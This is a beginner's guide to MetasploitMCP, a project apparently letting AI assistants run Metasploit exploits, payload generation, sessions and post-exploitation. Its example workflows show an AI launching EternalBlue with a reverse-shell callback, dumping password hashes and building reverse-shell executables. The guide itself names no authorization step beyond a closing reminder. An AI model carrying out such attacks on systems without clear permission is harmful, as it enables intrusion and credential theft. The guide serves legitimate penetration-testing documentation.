# 🎓 MetasploitMCP - Beginner's Guide

**Welcome!** This guide explains everything about MetasploitMCP in simple terms, perfect for beginners.

---

## 📚 Table of Contents

1. [What is MetasploitMCP?](#what-is-metasploitmcp)
2. [Core Concepts](#core-concepts)
3. [Architecture Overview](#architecture-overview)
4. [System Components](#system-components)
5. [How Everything Works Together](#how-everything-works-together)
6. [Features Explained](#features-explained)
7. [Deployment Options](#deployment-options)
8. [Use Cases](#use-cases)
9. [Getting Started](#getting-started)
10. [Common Workflows](#common-workflows)

---

## What is MetasploitMCP?

**MetasploitMCP** is a bridge that connects AI assistants (like Claude, ChatGPT) to Metasploit Framework (a penetration testing tool).

### The Problem It Solves

Imagine you want to use an AI assistant to help with security testing, but:
- The AI can't directly control security tools
- You need to manually run commands and copy results back
- It's time-consuming and error-prone

### The Solution

MetasploitMCP creates a **standardized communication channel** so AI assistants can:
- ✅ Ask Metasploit to run exploits
- ✅ Get real-time results
- ✅ Manage sessions automatically
- ✅ Analyze vulnerabilities with AI

**Think of it as a translator between AI and security tools.**

---

## Core Concepts

### 1. Model Context Protocol (MCP)

**What is it?**
- A standard way for AI assistants to talk to external tools
- Like a universal remote control for AI

**Why it matters?**
- AI can use tools (like Metasploit) without being programmed for each one
- One protocol works with many AI assistants

### 2. Metasploit Framework

**What is it?**
- A popular penetration testing platform
- Contains thousands of exploits and security tools
- Used by security professionals worldwide

**Components:**
- **Exploits**: Code that takes advantage of vulnerabilities
- **Payloads**: Code that runs after successful exploitation
- **Modules**: Different types of tools (scanning, exploitation, post-exploitation)

### 3. RPC (Remote Procedure Call)

**What is it?**
- A way to control Metasploit remotely
- Like controlling your computer from your phone

**In this project:**
- `msfrpcd` is the RPC daemon (server) that listens for commands
- MetasploitMCP sends commands to msfrpcd
- Results come back to share with the AI

### 4. Transport Modes

**Two ways to communicate:**

#### HTTP/SSE (Server-Sent Events)
- **Use case**: Web-based, cloud deployments
- **How it works**: Like a website that pushes updates
- **Example**: Deployed on Fly.io, accessible via browser

#### STDIO (Standard Input/Output)
- **Use case**: Desktop applications like Claude Desktop
- **How it works**: Direct pipe communication
- **Example**: Running locally on your computer

---

## Architecture Overview

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        USER                                  │
│                     (You/Tester)                            │
└─────────────────┬───────────────────────────────────────────┘
                  │
                  ↓
┌─────────────────────────────────────────────────────────────┐
│                    AI ASSISTANT                              │
│              (Claude, ChatGPT, etc.)                        │
│                                                              │
│  "Can you scan 192.168.1.1 for vulnerabilities?"           │
└─────────────────┬───────────────────────────────────────────┘
                  │
                  │ MCP Protocol
                  ↓
┌─────────────────────────────────────────────────────────────┐
│                  METASPLOITMCP SERVER                        │
│                  (This Project)                             │
│                                                              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐     │
│  │   HTTP/SSE   │  │    STDIO     │  │  AI Helper   │     │
│  │   Transport  │  │  Transport   │  │  (OpenRouter)│     │
│  └──────────────┘  └──────────────┘  └──────────────┘     │
│                                                              │
│  ┌─────────────────────────────────────────────────┐       │
│  │            MCP Tools (13 Tools)                 │       │
│  │  • list_exploits    • run_exploit               │       │
│  │  • list_payloads    • generate_payload          │       │
│  │  • list_sessions    • send_command              │       │
│  │  • analyze_with_ai  • and more...               │       │
│  └─────────────────────────────────────────────────┘       │
└─────────────────┬───────────────────────────────────────────┘
                  │
                  │ RPC Protocol
                  ↓
┌─────────────────────────────────────────────────────────────┐
│               METASPLOIT FRAMEWORK                           │
│                  (msfrpcd daemon)                           │
│                                                              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐     │
│  │   Exploits   │  │   Payloads   │  │   Sessions   │     │
│  │   (3000+)    │  │   (500+)     │  │   (Active)   │     │
│  └──────────────┘  └──────────────┘  └──────────────┘     │
└─────────────────┬───────────────────────────────────────────┘
                  │
                  │ Network/Exploit
                  ↓
┌─────────────────────────────────────────────────────────────┐
│                    TARGET SYSTEMS                            │
│            (Systems being tested)                           │
└─────────────────────────────────────────────────────────────┘
```

### Architecture Layers

#### Layer 1: User Interface
- **You** interact with an AI assistant
- Use natural language: "Find exploits for Windows Server"
- No need to know Metasploit syntax

#### Layer 2: AI Assistant
- Understands your request
- Decides which MCP tools to use
- Formats requests and interprets results

#### Layer 3: MetasploitMCP Server
- Receives MCP tool requests
- Translates to Metasploit RPC commands
- Returns structured results
- Optionally uses AI for analysis

#### Layer 4: Metasploit Framework
- Executes actual security operations
- Manages exploits, payloads, sessions
- Handles network communication

#### Layer 5: Target Systems
- Systems being tested
- Receive exploits/payloads
- Send back results

---

## System Components

### 1. MetasploitMCP Server (Main Application)

**File**: `MetasploitMCP.py`

**What it does:**
- Starts the MCP server
- Handles communication with AI assistants
- Manages connection to Metasploit
- Provides 13 different tools

**Key Functions:**
```python
# Server modes
--transport http    # Web-based mode
--transport stdio   # Desktop mode
--mock             # Test mode (no real Metasploit)
```

**Configuration:**
```bash
# From .env.local file
MSF_PASSWORD=your_password          # Metasploit RPC password
MSF_SERVER=127.0.0.1               # Where Metasploit is running
MSF_PORT=55553                     # Metasploit RPC port
OPENROUTER_API_KEY=your_key        # For AI features (optional)
```

### 2. Metasploit RPC Client

**What it does:**
- Connects to msfrpcd (Metasploit daemon)
- Sends commands
- Receives results
- Handles authentication

**Connection Process:**
1. Read credentials from `.env.local`
2. Connect to msfrpcd (usually localhost:55553)
3. Authenticate with password
4. Keep connection alive
5. Send/receive commands

### 3. MCP Tools (13 Tools)

#### Module Information Tools

**`list_exploits`**
- **Purpose**: Find available exploits
- **Input**: Search term (e.g., "windows", "ssh")
- **Output**: List of matching exploits
- **Example**: "Show me all Windows exploits"

**`list_payloads`**
- **Purpose**: Find available payloads
- **Input**: Platform (windows/linux), architecture (x86/x64)
- **Output**: List of compatible payloads
- **Example**: "What payloads work on Linux x64?"

#### Exploitation Tools

**`run_exploit`**
- **Purpose**: Execute an exploit against a target
- **Input**: 
  - Exploit name
  - Target options (IP, port, etc.)
  - Payload to use
  - Payload options (callback IP/port)
- **Output**: Success/failure, session ID if successful
- **Example**: "Exploit 192.168.1.100 using ms17_010"

**`run_auxiliary_module`**
- **Purpose**: Run scanners and auxiliary modules
- **Input**: Module name, options
- **Output**: Scan results
- **Example**: "Scan port 445 on 192.168.1.0/24"

**`run_post_module`**
- **Purpose**: Run post-exploitation modules
- **Input**: Module name, session ID
- **Output**: Information gathered
- **Example**: "Dump hashes from session 1"

#### Payload Tools

**`generate_payload`**
- **Purpose**: Create payload files (exe, elf, etc.)
- **Input**: Payload type, format, options
- **Output**: File path where payload is saved
- **Example**: "Generate a Windows reverse shell exe"

#### Session Management Tools

**`list_active_sessions`**
- **Purpose**: Show all active sessions
- **Output**: List of sessions with details
- **Example**: "What sessions are active?"

**`send_session_command`**
- **Purpose**: Run commands in a session
- **Input**: Session ID, command
- **Output**: Command results
- **Example**: "Run 'whoami' in session 1"

**`terminate_session`**
- **Purpose**: Close a session
- **Input**: Session ID
- **Output**: Confirmation
- **Example**: "Close session 1"

#### Handler Management Tools

**`list_listeners`**
- **Purpose**: Show active handlers/jobs
- **Output**: List of running handlers
- **Example**: "What handlers are running?"

**`start_listener`**
- **Purpose**: Start a handler to receive connections
- **Input**: Payload type, IP, port
- **Output**: Job ID
- **Example**: "Start a reverse TCP handler on port 4444"

**`stop_job`**
- **Purpose**: Stop a handler or job
- **Input**: Job ID
- **Output**: Confirmation
- **Example**: "Stop job 1"

#### AI-Powered Tools (Optional)

**`analyze_exploit_with_ai`**
- **Purpose**: Get AI analysis of an exploit
- **Input**: Exploit name
- **Output**: Technical analysis, risks, recommendations
- **Example**: "Analyze the ms17_010 exploit"

**`generate_metasploit_commands_with_ai`**
- **Purpose**: Convert natural language to Metasploit commands
- **Input**: Natural language description
- **Output**: Step-by-step commands
- **Example**: "How do I exploit a vulnerable SSH server?"

**`analyze_vulnerability_with_ai`**
- **Purpose**: Analyze a vulnerability
- **Input**: Vulnerability description or CVE
- **Output**: Exploitation approach, tools needed
- **Example**: "Analyze CVE-2023-1234"

### 4. Transport Handlers

#### HTTP/SSE Transport
- **Port**: 8080 (default, configurable)
- **Endpoints**:
  - `/` - Home page
  - `/docs` - API documentation
  - `/sse` - Server-Sent Events endpoint
  - `/openapi.json` - API specification

#### STDIO Transport
- Uses standard input/output
- Direct pipe communication
- No network required

### 5. Management Scripts

**`start-msfrpcd.sh`**
- Starts Metasploit RPC daemon
- Loads configuration from `.env.local`
- Checks if already running

**`stop-msfrpcd.sh`**
- Stops Metasploit RPC daemon gracefully
- Falls back to force kill if needed

**`quickref.sh`**
- Quick reference guide
- Shows common commands

### 6. Docker Support

**`Dockerfile`**
- Builds container image
- Runs in mock mode (no Metasploit)
- For cloud deployments

**`Dockerfile.metasploit`**
- Includes Metasploit Framework
- Larger image (~2GB+)
- For complete functionality

### 7. Testing Framework

**Test Files:**
- `tests/test_options_parsing.py` - Tests option parsing
- `tests/test_helpers.py` - Tests helper functions
- `tests/test_tools_integration.py` - Tests MCP tools
- `conftest.py` - Test configuration
- `pytest.ini` - Pytest settings

**Running Tests:**
```bash
make test              # Run all tests
make test-unit         # Unit tests only
make coverage          # With coverage report
```

---

## How Everything Works Together

### Scenario 1: Simple Exploit (HTTP Mode)

```
1. USER → AI Assistant
   "Exploit 192.168.1.100 using ms17_010"

2. AI Assistant → MetasploitMCP
   MCP Request: run_exploit()
   Parameters: {
     exploit: "exploit/windows/smb/ms17_010_eternalblue",
     target_opts: {"RHOSTS": "192.168.1.100"},
     payload: "windows/x64/meterpreter/reverse_tcp",
     payload_opts: {"LHOST": "192.168.1.50", "LPORT": 4444}
   }

3. MetasploitMCP → Metasploit (msfrpcd)
   RPC Call: module.execute
   With all parameters

4. Metasploit → Target
   Sends exploit packets
   Establishes session if successful

5. Metasploit → MetasploitMCP
   Returns: {session_id: 1, success: true}

6. MetasploitMCP → AI Assistant
   Formatted response

7. AI Assistant → USER
   "Successfully exploited! Session 1 is active."
```

### Scenario 2: AI-Powered Analysis

```
1. USER → AI Assistant
   "Tell me about the ms17_010 exploit"

2. AI Assistant → MetasploitMCP
   MCP Request: analyze_exploit_with_ai()
   Parameters: {exploit_name: "ms17_010"}

3. MetasploitMCP → OpenRouter API
   Sends exploit details
   Requests analysis

4. OpenRouter (AI Model) → MetasploitMCP
   Returns: Detailed analysis, risks, mitigations

5. MetasploitMCP → AI Assistant
   Formatted analysis

6. AI Assistant → USER
   "MS17-010 is a critical Windows SMB vulnerability..."
```

### Scenario 3: Local Desktop Use (STDIO Mode)

```
1. Claude Desktop starts MetasploitMCP
   Via: uv run MetasploitMCP.py --transport stdio

2. Direct pipe communication established
   STDIN ← Commands to MetasploitMCP
   STDOUT → Results from MetasploitMCP

3. User chats with Claude
   Claude uses MCP tools automatically

4. MetasploitMCP ↔ msfrpcd
   Local RPC communication (127.0.0.1:55553)

5. Real-time results
   No web server needed
   Fast, direct communication
```

---

## Features Explained

### 1. Mock Mode

**What is it?**
- Test mode without real Metasploit
- Returns fake data for all operations

**When to use:**
- Testing the MCP integration
- Demos without security tools
- Development without Metasploit installed

**How to use:**
```bash
python MetasploitMCP.py --mock --transport http
```

### 2. OpenRouter Integration

**What is it?**
- Connection to AI models (Claude, GPT-4, etc.)
- For AI-powered analysis tools

**Setup:**
```bash
# Get API key from https://openrouter.ai/
OPENROUTER_API_KEY=your_key_here

# Optional: Use your own AI service
OPENROUTER_BASE_URL=https://your-ai-service.com/v1
```

**What it enables:**
- Exploit analysis
- Vulnerability assessment
- Natural language command generation

### 3. Payload Generation

**What it does:**
- Creates executable payloads (exe, elf, etc.)
- Saves to local directory
- Configurable save location

**Default location:**
- `~/payloads/` (Linux/Mac)
- `C:\Users\YourName\payloads\` (Windows)

**Custom location:**
```bash
export PAYLOAD_SAVE_DIR=/custom/path
```

### 4. Auto-Scaling (Fly.io)

**What is it?**
- Automatic start/stop of server instances
- Saves money when not in use

**How it works:**
1. No requests → Server stops after timeout
2. New request arrives → Server starts automatically
3. Request processed → Results returned
4. No activity → Stops again

**Configuration in `fly.toml`:**
```toml
auto_stop_machines = 'stop'
auto_start_machines = true
min_machines_running = 0
```

### 5. Security Features

**Password Security:**
- Generated with OpenSSL (32 characters)
- Stored in `.env.local` (not in git)
- Never hardcoded

**Connection Security:**
- SSL/TLS support for RPC
- HTTPS automatic on Fly.io
- Secret management in cloud

**Access Control:**
- Limited connections (25 max)
- Firewall-friendly configuration
- Port restrictions

---

## Deployment Options

### 1. Local Development

**Best for:** Testing, development, learning

**Setup:**
```bash
# Install dependencies
pip install -r requirements.txt

# Configure
cp .env.example .env.local
nano .env.local

# Start msfrpcd
make start-msf

# Start server
python MetasploitMCP.py --transport http
```

**Pros:**
- ✅ Full control
- ✅ Easy debugging
- ✅ Fast iteration

**Cons:**
- ❌ Not accessible remotely
- ❌ Manual management
- ❌ Requires local Metasploit

### 2. Fly.io (Cloud)

**Best for:** Demos, web-based use, prototypes

**Setup:**
```bash
flyctl launch
flyctl secrets set MSFRPCD_PASSWORD=xxx
flyctl deploy
```

**Pros:**
- ✅ 5-minute setup
- ✅ HTTPS automatic
- ✅ Auto-scaling
- ✅ Low cost ($5-10/mo)

**Cons:**
- ❌ Mock mode by default
- ❌ Needs external Metasploit for real use
- ❌ Limited control

**Live Demo:** https://metasploit-mcp.fly.dev/

### 3. Oracle Cloud

**Best for:** Production, long-running, free tier

**Setup:**
```bash
# Create compute instance
# Install Docker
docker build -t metasploit-mcp .
docker run -d -p 8080:8080 metasploit-mcp
```

**Pros:**
- ✅ Free tier (24GB RAM!)
- ✅ Full control
- ✅ Always running
- ✅ Can install real Metasploit

**Cons:**
- ❌ 30+ minute setup
- ❌ Manual SSL setup
- ❌ You manage security

### 4. Docker

**Best for:** Consistent environments, easy deployment

**Setup:**
```bash
docker build -t metasploit-mcp .
docker run -d -p 8080:8080 \
  -e MSFRPCD_PASSWORD=xxx \
  metasploit-mcp
```

**Pros:**
- ✅ Portable
- ✅ Reproducible
- ✅ Isolated

**Cons:**
- ❌ Docker knowledge required
- ❌ Network configuration needed

### 5. Kubernetes

**Best for:** Enterprise, high availability, scale

**Setup:**
```bash
kubectl apply -f k8s/deployment.yaml
```

**Pros:**
- ✅ High availability
- ✅ Auto-scaling
- ✅ Load balancing
- ✅ Self-healing

**Cons:**
- ❌ Complex setup
- ❌ K8s expertise required
- ❌ Higher cost

---

## Use Cases

### 1. Security Research

**Scenario:** Research a new vulnerability

**Workflow:**
1. Ask AI: "Tell me about CVE-2023-XXXX"
2. AI analyzes vulnerability
3. Ask: "What Metasploit exploits target this?"
4. AI finds relevant exploits
5. Ask: "How do I test this safely?"
6. AI provides safe testing approach

### 2. Penetration Testing

**Scenario:** Test a client's network

**Workflow:**
1. Ask: "Scan 192.168.1.0/24 for SMB vulnerabilities"
2. AI runs auxiliary scanner
3. Ask: "Exploit vulnerable hosts"
4. AI runs appropriate exploits
5. Ask: "Gather system information from sessions"
6. AI runs post-exploitation modules
7. Ask: "Generate a report"
8. AI summarizes findings

### 3. Security Training

**Scenario:** Learning Metasploit

**Workflow:**
1. Ask: "How do I exploit a vulnerable FTP server?"
2. AI explains and demonstrates
3. Practice in safe lab environment
4. AI provides real-time guidance
5. Learn without memorizing commands

### 4. Automation

**Scenario:** Automate repetitive testing

**Workflow:**
1. Define test scenario in natural language
2. AI executes multiple tools in sequence
3. Collects results automatically
4. Generates structured report
5. No scripting required

### 5. Demo/Education

**Scenario:** Demonstrate security concepts

**Workflow:**
1. Use mock mode (no real hacking)
2. Show how exploits work
3. Explain vulnerabilities
4. Safe for presentations
5. No risk to systems

---

## Getting Started

### Prerequisites Checklist

- [ ] Python 3.10 or higher
- [ ] Metasploit Framework (or use mock mode)
- [ ] Basic networking knowledge
- [ ] Terminal/command line familiarity

### Quick Start Guide

#### Step 1: Clone Repository
```bash
git clone https://github.com/FandresenaR/MetasploitMCP.git
cd MetasploitMCP
```

#### Step 2: Install Dependencies
```bash
pip install -r requirements.txt
```

#### Step 3: Configure Environment
```bash
cp .env.example .env.local
nano .env.local  # Edit with your values
```

#### Step 4: Choose Mode

**Option A: Mock Mode (No Metasploit needed)**
```bash
python MetasploitMCP.py --mock --transport http
```

**Option B: Real Mode (Metasploit required)**
```bash
# Start Metasploit RPC
make start-msf

# Start MCP server
python MetasploitMCP.py --transport http
```

#### Step 5: Access Server

**Web browser:**
```
http://localhost:8080/docs
```

**Or configure AI assistant** (see README.md)

### First Commands

Once running, try these through the AI:

1. **List exploits:**
   ```
   "Show me exploits for Windows"
   ```

2. **List payloads:**
   ```
   "What payloads work on Linux?"
   ```

3. **Start a listener:**
   ```
   "Start a reverse TCP handler on port 4444"
   ```

4. **Generate payload:**
   ```
   "Generate a Windows reverse shell exe"
   ```

---

## Common Workflows

### Workflow 1: Scanning and Exploitation

```
1. "Scan 192.168.1.100 for open ports"
   → Runs auxiliary scanner

2. "What exploits are available for Windows SMB?"
   → Lists relevant exploits

3. "Start a reverse TCP handler on port 4444"
   → Sets up listener

4. "Exploit 192.168.1.100 using ms17_010"
   → Runs exploit, creates session

5. "What sessions are active?"
   → Shows session 1

6. "Run 'whoami' in session 1"
   → Executes command

7. "Gather password hashes from session 1"
   → Runs post-exploitation

8. "Close session 1"
   → Cleans up
```

### Workflow 2: Payload Generation

```
1. "Generate a Windows reverse shell exe"
   → Creates payload.exe

2. "Generate a Linux reverse shell elf"
   → Creates payload.elf

3. "Generate a Python reverse shell"
   → Creates payload.py

4. "Where are the payloads saved?"
   → Shows save directory
```

### Workflow 3: Analysis and Learning

```
1. "Analyze the ms17_010 exploit"
   → AI provides detailed analysis

2. "What are the risks of using this exploit?"
   → AI explains risks

3. "How do I use this safely?"
   → AI provides safety guidelines

4. "Show me the Metasploit commands"
   → AI generates command sequence
```

---

## Understanding the Data Flow

### Request Flow (Detailed)

```
┌──────────────────────────────────────────────────────────┐
│ 1. USER INPUT                                             │
│    "Exploit 192.168.1.100"                               │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ↓
┌──────────────────────────────────────────────────────────┐
│ 2. AI ASSISTANT                                           │
│    • Parses natural language                             │
│    • Selects tool: run_exploit()                         │
│    • Prepares parameters                                 │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ↓
┌──────────────────────────────────────────────────────────┐
│ 3. MCP PROTOCOL                                           │
│    JSON-RPC Request:                                     │
│    {                                                      │
│      "method": "tools/call",                            │
│      "params": {                                         │
│        "name": "run_exploit",                           │
│        "arguments": {...}                                │
│      }                                                    │
│    }                                                      │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ↓
┌──────────────────────────────────────────────────────────┐
│ 4. METASPLOITMCP SERVER                                   │
│    • Receives MCP request                                │
│    • Validates parameters                                │
│    • Maps to Metasploit RPC call                        │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ↓
┌──────────────────────────────────────────────────────────┐
│ 5. METASPLOIT RPC PROTOCOL                                │
│    msgpack-RPC Request:                                  │
│    {                                                      │
│      "method": "module.execute",                        │
│      "type": "exploit",                                  │
│      "fullname": "exploit/...",                         │
│      "options": {...}                                    │
│    }                                                      │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ↓
┌──────────────────────────────────────────────────────────┐
│ 6. METASPLOIT FRAMEWORK                                   │
│    • Loads exploit module                                │
│    • Validates options                                   │
│    • Executes exploit                                    │
│    • Creates session (if successful)                     │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ↓
┌──────────────────────────────────────────────────────────┐
│ 7. TARGET SYSTEM                                          │
│    • Receives exploit packets                            │
│    • Executes payload (if vulnerable)                    │
│    • Connects back to handler                            │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ↓
┌──────────────────────────────────────────────────────────┐
│ 8. RESULTS FLOW BACK                                      │
│    Target → Metasploit → MetasploitMCP → AI → User      │
│                                                           │
│    Final Output:                                         │
│    "Successfully exploited! Session 1 is active."        │
└──────────────────────────────────────────────────────────┘
```

---

## Troubleshooting Guide

### Common Issues

#### 1. Can't Connect to Metasploit

**Symptoms:**
- "Connection refused" errors
- "Unable to connect to msfrpcd"

**Solutions:**
```bash
# Check if msfrpcd is running
pgrep msfrpcd

# Start if not running
make start-msf

# Check the port
netstat -tuln | grep 55553

# Verify credentials in .env.local
cat .env.local | grep MSF_PASSWORD
```

#### 2. Mock Mode Not Working

**Symptoms:**
- Still trying to connect to Metasploit
- Not returning mock data

**Solution:**
```bash
# Ensure --mock flag is used
python MetasploitMCP.py --mock --transport http

# Check logs for "Running in MOCK mode"
```

#### 3. AI Features Not Working

**Symptoms:**
- analyze_exploit_with_ai returns errors
- "OpenRouter API key not set"

**Solution:**
```bash
# Set API key in .env.local
echo "OPENROUTER_API_KEY=your_key" >> .env.local

# Restart server
```

#### 4. Payloads Not Saving

**Symptoms:**
- "Failed to save payload"
- Permission errors

**Solution:**
```bash
# Check save directory exists and is writable
ls -la ~/payloads

# Create if missing
mkdir -p ~/payloads

# Set custom location
export PAYLOAD_SAVE_DIR=/custom/path
```

#### 5. Cloud Deployment Issues

**Fly.io:**
```bash
# Check logs
flyctl logs

# Verify secrets
flyctl secrets list

# Restart app
flyctl deploy
```

**Oracle Cloud:**
```bash
# Check firewall
sudo iptables -L -n

# Check service
docker ps
docker logs metasploit-mcp

# Check OCI Security List
# (via web console)
```

---

## Next Steps

### For Beginners

1. **Start with Mock Mode**
   - No Metasploit needed
   - Safe to experiment
   - Learn the tools

2. **Read the Docs**
   - README.md for overview
   - DEPLOYMENT.md for setup
   - This guide for understanding

3. **Try Simple Commands**
   - List exploits
   - Generate payloads
   - Use AI analysis

4. **Set Up Local Instance**
   - Install Metasploit
   - Configure msfrpcd
   - Test in safe environment

### For Intermediate Users

1. **Deploy to Cloud**
   - Try Fly.io for quick deploy
   - Or Oracle Cloud for free tier

2. **Integrate with AI Assistant**
   - Configure Claude Desktop
   - Or use HTTP mode with your AI

3. **Automate Workflows**
   - Create test scenarios
   - Build automation scripts

4. **Contribute**
   - Report issues
   - Suggest features
   - Submit pull requests

### For Advanced Users

1. **Custom Deployment**
   - Kubernetes configuration
   - High availability setup
   - Security hardening

2. **Extend Functionality**
   - Add new MCP tools
   - Custom AI integrations
   - Additional transports

3. **Production Use**
   - Scale testing
   - Performance optimization
   - Monitoring and logging

---

## Resources

### Documentation
- [README.md](README.md) - Main documentation
- [DEPLOYMENT.md](DEPLOYMENT.md) - Deployment guide
- [CHANGELOG.md](CHANGELOG.md) - Version history
- [MSFRPCD_MANAGEMENT.md](MSFRPCD_MANAGEMENT.md) - msfrpcd guide

### External Resources
- [Metasploit Documentation](https://docs.metasploit.com/)
- [MCP Protocol Specification](https://modelcontextprotocol.io/)
- [OpenRouter Documentation](https://openrouter.ai/docs)
- [Fly.io Documentation](https://fly.io/docs/)
- [Oracle Cloud Documentation](https://docs.oracle.com/cloud/)

### Community
- GitHub Issues: Report bugs, request features
- GitHub Discussions: Ask questions, share ideas
- Metasploit Community: Learn about exploits
- Security Conferences: Stay updated

---

## Glossary

**AI Assistant**: Software like Claude or ChatGPT that uses AI to help users

**Exploit**: Code that takes advantage of a security vulnerability

**MCP**: Model Context Protocol - standard for AI tool communication

**Metasploit**: Popular penetration testing framework

**msfrpcd**: Metasploit RPC daemon - server for remote control

**Mock Mode**: Test mode that simulates functionality without real operations

**Payload**: Code that runs after successful exploitation

**Penetration Testing**: Security testing by simulating attacks

**RPC**: Remote Procedure Call - method for remote program control

**Session**: Active connection to a compromised system

**SSE**: Server-Sent Events - technology for server-to-client updates

**STDIO**: Standard Input/Output - direct program communication

**Transport**: Communication method between components

**Vulnerability**: Security weakness in software/hardware

---

## Summary

**MetasploitMCP** bridges the gap between AI assistants and security tools, making penetration testing more accessible and efficient.

**Key Points:**
- ✅ Connects AI to Metasploit Framework
- ✅ 13 powerful tools for security testing
- ✅ Multiple deployment options
- ✅ AI-powered analysis features
- ✅ Mock mode for safe learning
- ✅ Production-ready architecture

**Best Use Cases:**
- Security research and testing
- Learning penetration testing
- Automating security workflows
- Demonstrating security concepts

**Getting Help:**
- Read documentation in this repository
- Check troubleshooting section above
- Open GitHub issues for problems
- Join community discussions

---

**Welcome to MetasploitMCP!** 🚀

You're now ready to understand and use this powerful tool. Start with mock mode, explore the features, and gradually move to more advanced uses as you become comfortable.

**Remember**: Always use security tools ethically and legally, only on systems you have permission to test!

---

*Last updated: October 18, 2025*  
*Version: 1.0*  
*Maintained by: FandresenaR*
